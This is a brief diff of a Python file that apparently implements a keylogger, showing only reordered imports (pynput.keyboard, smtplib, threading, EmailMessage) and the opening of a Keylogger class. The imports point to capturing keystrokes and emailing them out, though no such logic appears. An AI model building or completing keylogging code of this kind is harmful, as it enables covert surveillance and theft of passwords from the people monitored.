@@ -1,9 +1,10 @@
 # Made by Snavellet
 
-import threading
-import pynput.keyboard
 import smtplib
+import threading
 from email.message import EmailMessage
+
+import pynput.keyboard
 
 
 class Keylogger:
